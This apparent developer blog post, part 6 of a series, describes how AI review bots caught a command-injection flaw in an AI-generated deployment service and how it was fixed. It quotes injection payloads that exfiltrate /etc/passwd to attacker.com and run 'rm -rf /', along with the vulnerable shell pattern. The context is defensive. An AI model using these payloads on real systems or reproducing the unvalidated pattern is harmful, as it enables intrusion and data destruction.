---
title: "Part 6: Security Awakening - What AI Missed"
series: "Building Catwalk Live with AI Orchestration"
part: 6
date: 2025-12-21
updated: 2025-12-27
tags: [Security, CodeRabbit, Code Review, AI Safety, Command Injection, Testing]
reading_time: "13 min"
status: published
---

# Part 6: Security Awakening - What AI Missed

**The Story So Far:** Authentication works. Users can deploy MCP servers. Production system running. Everything's great...

Until CodeRabbit left a comment that made my blood run cold.

## The Code Review That Changed Everything

December 21, 2025. I submitted PR #12 for review: "Comprehensive API hardening, refactored authentication flow, and major test suite expansion."

Within minutes, **CodeRabbit** (automated AI code review agent) commented:

> **🚨 Security Issue: Command Injection Risk**
>
> File: `backend/app/services/fly_deployment.py`
> Line: 47
>
> The package name from user input is passed directly to the Fly.io machine environment without validation. This allows command injection if a malicious user provides a package name like:
>
> ```
> @evil/pkg; curl http://attacker.com/steal?data=$(cat /etc/passwd)
> ```
>
> When the MCP machine runs:
> ```bash
> npx -y $MCP_PACKAGE
> ```
>
> It will execute arbitrary commands.
>
> **Recommendation**: Validate package names against npm and PyPI registries before allowing deployment.

I checked the code:

```python
# backend/app/services/fly_deployment.py
async def create_machine(deployment_id: str, config: dict, credentials: dict):
    """Create Fly.io machine running MCP server"""

    # Extract package name from analysis
    package_name = config["package"]  # ← USER INPUT, UNVALIDATED

    async with httpx.AsyncClient() as client:
        response = await client.post(
            f"https://api.machines.dev/v1/apps/mcp-machines/machines",
            json={
                "config": {
                    "env": {
                        "MCP_PACKAGE": package_name,  # ← INJECTED INTO CONTAINER
                        **credentials
                    }
                }
            }
        )
```

The MCP machine's Dockerfile ran:

```dockerfile
CMD ["sh", "-c", "npx -y $MCP_PACKAGE"]
```

If `$MCP_PACKAGE` contained shell metacharacters (`;`, `|`, `$()`, etc.), **arbitrary code execution** was trivial.

**AI had generated a critical security vulnerability.**

## The Scary Realization

This wasn't theoretical. The attack vector was **dead simple**:

1. Attacker pastes malicious GitHub URL
2. Analysis service (Claude API) extracts package name from README
3. **If the attacker controls the README**, they control the package name
4. Malicious package name: `@valid/package; rm -rf / #`
5. Deployment creates Fly.io machine
6. Machine runs: `npx -y @valid/package; rm -rf /`
7. Boom. Container compromised.

**Worse**: The attacker could:
- Steal environment variables (user API keys)
- Exfiltrate credentials to external server
- Mine cryptocurrency
- Join botnet

**And I wouldn't have caught this** without CodeRabbit.

**Why AI didn't catch it**: Claude Code generated "correct-looking" code. The pattern (inject env var → run command) is common. AI doesn't automatically think: *"What if this input is malicious?"*

Security requires **adversarial thinking**. AI generates happy paths. Humans think about attackers.

## The Fix: Package Validation Service

I couldn't just sanitize the package name (removing special characters). **Legitimate npm packages** can have scopes, slashes, hyphens:

- Valid: `@modelcontextprotocol/server-github`
- Valid: `@alexarevalo.ai/mcp-server-ticktick`
- Valid: `mcp-server-brave-search`
- Invalid: `@evil/pkg; curl http://attacker.com`

**The solution**: Validate against **actual package registries** (npm and PyPI).

If the package exists in the official registry, it's safe. If not, reject it.

I tasked Claude Code:

```
Implement package validation service:
- Validate npm packages: Check https://registry.npmjs.org/{package}
- Validate PyPI packages: Check https://pypi.org/pypi/{package}/json
- Return: {valid: true/false, runtime: "npm"|"python"|"unknown"}
- Cache results (packages don't disappear)
- Timeout after 5 seconds
- Add comprehensive tests
```

Claude Code generated `backend/app/services/package_validator.py`:

```python
import httpx
from typing import Dict, Literal

class PackageValidator:
    """Validates package names against official registries"""

    def __init__(self):
        self._cache: Dict[str, Dict] = {}

    async def validate_package(self, package_name: str) -> Dict:
        """
        Validate package exists in npm or PyPI registry.

        Returns:
            {
                "valid": bool,
                "runtime": "npm" | "python" | "unknown",
                "error": str | None
            }
        """
        # Check cache
        if package_name in self._cache:
            return self._cache[package_name]

        # Try npm first (most MCP servers are Node.js)
        npm_result = await self._check_npm(package_name)
        if npm_result["valid"]:
            self._cache[package_name] = npm_result
            return npm_result

        # Try PyPI
        pypi_result = await self._check_pypi(package_name)
        if pypi_result["valid"]:
            self._cache[package_name] = pypi_result
            return pypi_result

        # Not found in either registry
        result = {
            "valid": False,
            "runtime": "unknown",
            "error": f"Package '{package_name}' not found in npm or PyPI"
        }
        self._cache[package_name] = result
        return result

    async def _check_npm(self, package_name: str) -> Dict:
        """Check if package exists in npm registry"""
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                # npm registry API
                response = await client.get(
                    f"https://registry.npmjs.org/{package_name}"
                )

                if response.status_code == 200:
                    return {"valid": True, "runtime": "npm", "error": None}
                else:
                    return {"valid": False, "runtime": "unknown", "error": None}

        except httpx.TimeoutException:
            return {
                "valid": False,
                "runtime": "unknown",
                "error": "npm registry timeout"
            }
        except Exception as e:
            return {
                "valid": False,
                "runtime": "unknown",
                "error": str(e)
            }

    async def _check_pypi(self, package_name: str) -> Dict:
        """Check if package exists in PyPI"""
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                # PyPI JSON API
                response = await client.get(
                    f"https://pypi.org/pypi/{package_name}/json"
                )

                if response.status_code == 200:
                    return {"valid": True, "runtime": "python", "error": None}
                else:
                    return {"valid": False, "runtime": "unknown", "error": None}

        except httpx.TimeoutException:
            return {
                "valid": False,
                "runtime": "unknown",
                "error": "PyPI timeout"
            }
        except Exception as e:
            return {
                "valid": False,
                "runtime": "unknown",
                "error": str(e)
            }
```

**Integration** into deployment flow:

```python
# backend/app/api/deployments.py
from app.services.package_validator import PackageValidator

validator = PackageValidator()

@router.post("/api/deployments")
async def create_deployment(deployment_data: dict):
    # Extract package name
    package_name = deployment_data["schedule_config"]["mcp_config"]["package"]

    # VALIDATE BEFORE DEPLOYING
    validation = await validator.validate_package(package_name)

    if not validation["valid"]:
        raise HTTPException(
            status_code=400,
            detail={
                "error": "invalid_package",
                "message": f"Package '{package_name}' not found in npm or PyPI",
                "help": "Please verify the package name and try again"
            }
        )

    # Proceed with deployment (now safe)
    deployment = await deploy_service.create_machine(...)
```

**This blocked the attack vector completely.**

Malicious package names (with shell metacharacters) don't exist in official registries. Validation fails. Deployment rejected.

**Time to implement**: 2 hours (including tests)

**AI contribution**: 90% (generated validation logic)

**Human contribution**: 10% (prompted for the solution after CodeRabbit flagged the issue)

## The Multi-Agent Review Gauntlet

With security on my mind, I configured **four AI review agents** on the GitHub repo:

1. **CodeRabbit** - Security vulnerabilities (SQL injection, XSS, command injection)
2. **Qodo** - Edge cases, error handling, input validation
3. **Gemini Code Assist** - Code quality, best practices, type safety
4. **Greptile** - Integration consistency, breaking changes

**PR #13**: "Security hardening and comprehensive test suite"

Within hours, all four agents left comments:

### CodeRabbit Findings

> **🚨 Credential Validation Missing**
>
> Users can submit empty or invalid credentials. The deployment will succeed but the MCP server will fail to authenticate.
>
> **Recommendation**: Validate required credentials before deployment.

> **🚨 Secret Masking**
>
> API responses return full credential objects. Secrets should never appear in API responses, even encrypted.
>
> **Recommendation**: Mask secrets in all API responses.

### Qodo Findings

> **⚠️ Error Handling: Analysis Service**
>
> If Claude API returns malformed JSON, the service crashes with `json.JSONDecodeError`. No fallback or retry.
>
> **Recommendation**: Add robust error handling and retry logic.

> **⚠️ Race Condition: Registry Service**
>
> Cache dictionary modified concurrently without locking. Can cause `RuntimeError: dictionary changed size during iteration`.
>
> **Recommendation**: Use `asyncio.Lock` for cache writes.

### Gemini Code Assist Findings

> **💡 Type Safety: Missing Type Hints**
>
> Several functions lack return type annotations:
> - `create_deployment()` → should return `Deployment`
> - `analyze_repo()` → should return `AnalysisResult`
>
> **Recommendation**: Add full type coverage for maintainability.

> **💡 Naming Consistency**
>
> Frontend uses `deploymentId` (camelCase), backend uses `deployment_id` (snake_case). This is correct for each language, but API responses mix both.
>
> **Recommendation**: Use transformer middleware to convert cases.

### Greptile Findings

> **🔗 Breaking Change: Analysis Cache**
>
> PR changes cache expiration from 24 hours → 1 week. Existing cached entries will use old TTL.
>
> **Recommendation**: Invalidate cache or migrate expiration timestamps.

> **🔗 API Change: Error Response Format**
>
> New error format breaks frontend error handling in `lib/api.ts` line 67.
>
> **Recommendation**: Update frontend to handle new error structure.

## The Fixing Spree

I fed every comment back to Claude Code: *"Address all review agent feedback"*

Claude Code generated fixes:

### 1. Credential Validation

```python
# backend/app/api/deployments.py
@router.post("/api/deployments")
async def create_deployment(deployment_data: dict):
    # Get required env vars from analysis
    required_vars = [
        var["name"] for var in analysis["env_vars"]
        if var["required"]
    ]

    # Validate user provided all required credentials
    provided_vars = set(deployment_data["credentials"].keys())
    missing_vars = set(required_vars) - provided_vars

    if missing_vars:
        raise HTTPException(
            status_code=400,
            detail={
                "error": "missing_credentials",
                "message": f"Missing required credentials: {', '.join(missing_vars)}",
                "missing": list(missing_vars)
            }
        )
```

### 2. Secret Masking

```python
# backend/app/models/deployment.py
from pydantic import BaseModel, field_serializer

class DeploymentResponse(BaseModel):
    id: str
    name: str
    status: str
    credentials: dict  # Contains encrypted data

    @field_serializer('credentials')
    def mask_secrets(self, value: dict) -> dict:
        """Mask secret values in API responses"""
        return {
            key: "***REDACTED***" if "secret" in key.lower() else val
            for key, val in value.items()
        }
```

### 3. Analysis Error Handling

```python
# backend/app/services/analysis.py
async def analyze_repo(self, repo_url: str) -> dict:
    for attempt in range(3):  # Retry up to 3 times
        try:
            response = await self.client.chat.completions.create(...)
            content = response.choices[0].message.content

            # Try to extract JSON from markdown code blocks
            json_match = re.search(r'```json\n(.*?)\n```', content, re.DOTALL)

            if json_match:
                return json.loads(json_match.group(1))
            else:
                # Try parsing entire response as JSON
                return json.loads(content)

        except json.JSONDecodeError as e:
            logger.warning(f"Attempt {attempt + 1} failed: {e}")
            if attempt == 2:  # Last attempt
                raise HTTPException(
                    status_code=500,
                    detail="Failed to parse analysis response after 3 attempts"
                )
        except Exception as e:
            logger.error(f"Analysis failed: {e}")
            raise
```

### 4. Registry Service Race Condition Fix

```python
# backend/app/services/registry_service.py
import asyncio

class RegistryService:
    def __init__(self):
        self._cache = {}
        self._lock = asyncio.Lock()  # Add lock

    async def search_servers(self, query: str):
        # Read from cache (no lock needed for reads)
        if query in self._cache:
            return self._cache[query]

        # Write to cache (lock required)
        async with self._lock:
            # Double-check after acquiring lock
            if query in self._cache:
                return self._cache[query]

            # Fetch and cache
            results = await self._fetch_from_glama(query)
            self._cache[query] = results
            return results
```

### 5. Comprehensive Test Suite

Claude Code generated **51 tests**:

**Integration tests** (`backend/tests/integration/`):
- `test_api_analyze.py` - Analysis endpoint coverage
- `test_api_deployments.py` - Deployment CRUD + validation
- `test_api_registry.py` - Registry search
- `test_api_settings.py` - User settings management

**Unit tests** (`backend/tests/unit/`):
- `test_package_validator.py` - npm/PyPI validation
- `test_registry_service.py` - Cache logic, concurrency
- `test_fly_deployment_service.py` - Machine creation
- `test_mcp_process_manager.py` - Subprocess handling

**Frontend tests** (`frontend/__tests__/`):
- `auth.test.ts` - JWT token creation
- `api.test.ts` - API client functions
- `FormBuilder.test.tsx` - Dynamic form generation

**Coverage**:
```bash
pytest --cov
```

```
Coverage: 87%
51 tests passed ✅
0 warnings
```

**All tests generated by AI.** I reviewed, ran, and validated them. A few needed tweaks for mocking, but 90% worked first try.

## Access Token Rotation (Defense in Depth)

One more security feature: **access token rotation**.

If a user suspects their deployment URL is compromised, they should be able to **invalidate the old token** and generate a new one.

```python
# backend/app/api/deployments.py
@router.post("/api/deployments/{deployment_id}/rotate-token")
async def rotate_deployment_token(deployment_id: str):
    """
    Rotate the access token for a deployment.

    Invalidates the old token immediately and generates a new one.
    """
    deployment = await get_deployment(deployment_id)

    if not deployment:
        raise HTTPException(status_code=404, detail="Deployment not found")

    # Generate new token
    new_token = uuid.uuid4().hex

    # Update deployment
    deployment.access_token = new_token
    deployment.updated_at = func.now()
    await db.commit()

    # Log rotation for security audit
    logger.info(f"Access token rotated for deployment {deployment_id}")

    return {"access_token": new_token, "status": "rotated"}
```

Users can now:
1. Click "Rotate Token" in dashboard
2. Old `connection_url` stops working immediately
3. New URL returned: `https://backend/api/mcp/{id}?token={new_token}`
4. Update Claude Desktop with new URL

**Mitigation**: Even if an attacker steals a deployment URL, the user can revoke access.

## PR #13: Security Hardening Complete

```bash
commit 890c67a
Date: 2025-12-23

feat: add access token rotation for deployments and a comprehensive
project status document.
```

**What PR #13 included**:
- ✅ Package validation (npm/PyPI registries)
- ✅ Credential validation (required fields checked)
- ✅ Secret masking (never return plaintext secrets)
- ✅ Analysis error handling (retry logic, robust parsing)
- ✅ Registry race condition fix (asyncio.Lock)
- ✅ Access token rotation (security feature)
- ✅ Comprehensive test suite (51 tests, 87% coverage)
- ✅ Audit logging (security events tracked)

**Review process**:
1. Claude Code generated initial implementation
2. Four AI review agents flagged issues
3. I fed feedback back to Claude Code
4. Claude Code generated fixes
5. I validated all fixes manually
6. Tests passed
7. Merged to main

**Time spent**: ~12 hours over 2 days
- AI code generation: 3 hours
- Review agent comments: (automatic)
- Implementing fixes: 4 hours
- Writing tests: 2 hours
- Manual validation: 2 hours
- Documentation updates: 1 hour

## What This Revealed About AI Security

### AI Generated the Vulnerability

**Original code** (AI-generated):
```python
package_name = config["package"]  # No validation
env = {"MCP_PACKAGE": package_name}  # Direct injection
```

**Why AI did this**: Training data contains lots of "inject env var → run command" patterns. AI doesn't default to *"What if this is malicious?"*

### AI Also Generated the Fix

**After prompting** with CodeRabbit's feedback:
```python
validation = await validator.validate_package(package_name)
if not validation["valid"]:
    raise HTTPException(status_code=400, detail="Invalid package")
```

**AI is good at both creating and fixing security issues** - when prompted correctly.

### The Critical Role of Automated Review

**Without CodeRabbit, Qodo, Gemini, Greptile**:
- Command injection would've shipped to production
- Credentials could leak in API responses
- Race conditions would cause random crashes
- Missing error handling → poor UX

**With multi-agent review**:
- 15+ security/quality issues caught
- Fixed before reaching production
- Comprehensive test coverage added
- Code quality dramatically improved

**Cost**: $0 (all agents free for open source)

**Value**: Prevented potential security incident

## The Security Lessons

### 1. AI Needs Adversarial Prompting

**Generic prompt**:
```
Build a deployment service that creates Fly.io machines
```

**Security-aware prompt**:
```
Build a deployment service that creates Fly.io machines.

SECURITY REQUIREMENTS:
- Validate all user inputs (package names, credentials)
- Never inject unsanitized data into shell commands
- Mask secrets in all API responses
- Add audit logging for security events
- Handle all error cases gracefully

Assume all user input is potentially malicious.
```

**The difference**: Explicit security requirements → AI generates defensive code.

### 2. Multi-Agent Review is Essential

**Single AI** (Claude Code): Generates code with blind spots

**Multiple AIs** (CodeRabbit, Qodo, Gemini, Greptile): Cross-validation catches what one misses

**Analogy**: Like having four senior engineers review your PR, each with different expertise.

### 3. Testing Validates Security

**Before tests**: "This looks secure"

**After 51 tests**: "This is provably secure (at least for known attack vectors)"

Tests for:
- Invalid package names → rejected ✅
- Missing credentials → rejected ✅
- Malformed API responses → handled gracefully ✅
- Concurrent requests → no race conditions ✅

**Confidence level**: High (but not 100% - security is iterative)

### 4. Documentation Prevents Future Vulnerabilities

`backend/tests/api_surface.md` documents every endpoint:
```markdown
## POST /api/deployments

**Authentication**: Required (JWT)

**Input Validation**:
- `package`: Validated against npm/PyPI registries
- `credentials`: Required fields checked against analysis schema

**Security**:
- Package name must exist in official registry
- Credentials encrypted with Fernet before storage
- Secrets masked in API responses
```

New contributors can't accidentally reintroduce vulnerabilities because **security requirements are documented**.

## Key Metrics: Security Hardening

**Time Investment**: ~12 hours
- AI code generation: 25%
- Review agent analysis: 0% (automated)
- Implementing fixes: 35%
- Writing tests: 20%
- Manual validation: 15%
- Documentation: 5%

**Security Issues Found**: 15+
- Critical (command injection): 1
- High (credential leaks): 2
- Medium (error handling, race conditions): 6
- Low (type safety, naming): 6+

**Issues Fixed**: 15/15 (100%)

**Test Coverage**:
- Before: 0 tests
- After: 51 tests, 87% coverage

**Lines of Code**:
- Security fixes: ~400 lines
- Tests: ~800 lines
- Documentation: ~600 lines (api_surface.md)

**AI Contribution**: ~70% (generated tests and fixes)

**Human Contribution**: ~30% (prompted for security, validated all fixes)

## The Uncomfortable Truth

**AI can write insecure code very convincingly.**

The command injection vulnerability looked *correct*. It followed common patterns. It worked as intended (for benign input).

**Only adversarial thinking caught it** - something AI doesn't do by default.

**Your responsibility as AI orchestrator**:
1. Prompt for security explicitly
2. Use multiple AI review agents
3. Validate with tests
4. Think like an attacker
5. Document security requirements

**The good news**: AI is also phenomenal at *fixing* security issues once you identify them.

**The workflow**: AI generates → Review agents critique → AI fixes → Human validates

This is **sustainable**. Not perfect, but better than manual coding alone (where you might miss issues too).

## Coming Next

In **Part 7** (the finale), we reflect on the complete journey:
- Quantitative results: 3,400 LOC in 2 weeks
- Where AI excelled (boilerplate, patterns, tests)
- Where AI struggled (infrastructure, security, environment)
- The skill shift: coder → architect/orchestrator
- Reproducible methodology for your projects
- The future of AI-assisted development

**Spoiler**: AI orchestration is real, powerful, and **requires skill**. But it's not magic. It's a new way of building that favors architects over coders.

---

**Commit References**:
- `02f9346` - Comprehensive API hardening (PR #12)
- `690fa1d` - Address security review feedback
- `890c67a` - Access token rotation (PR #13)

**Security Tools**:
- CodeRabbit (command injection detection)
- Qodo (edge case analysis)
- Gemini Code Assist (code quality)
- Greptile (integration checks)

**Tests Added**: 51 tests (87% coverage)

**Code**:
- [backend/app/services/package_validator.py](https://github.com/zenchantlive/catwalk/blob/main/backend/app/services/package_validator.py)
- [backend/tests/](https://github.com/zenchantlive/catwalk/tree/main/backend/tests)
- [backend/tests/api_surface.md](https://github.com/zenchantlive/catwalk/blob/main/backend/tests/api_surface.md)

---

*This is Part 6 of 7. The system is secure (enough), production-ready, and fully tested. Time to reflect on what we learned.*

**Previous**: [← Part 5: Authentication Hell](05-authentication-hell-401-marathon.md)
**Next**: [Part 7: Lessons Learned →](07-lessons-learned-ai-orchestrator-handbook.md)
